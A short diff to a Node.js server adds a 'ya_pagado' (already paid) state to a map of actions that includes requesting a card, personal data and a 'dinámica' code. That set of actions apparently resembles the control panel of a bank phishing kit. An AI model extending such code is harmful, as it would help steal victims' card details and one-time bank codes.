@@ -466,7 +466,8 @@ const server = http.createServer(async (req, res) => {
                         AUTORIZAR: 'autorizacion_enviada',
                         PEDIR_CC: 'pedir_cc',
                         PEDIR_DATOS: 'pedir_datos',
-                        PEDIR_DINAMICA: 'pedir_dinamica'
+                        PEDIR_DINAMICA: 'pedir_dinamica',
+                        YA_PAGO: 'ya_pagado' // 🔥 Nuevo estado
                     };
                     if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                     let estadoNuevo = mapEstados[accion];
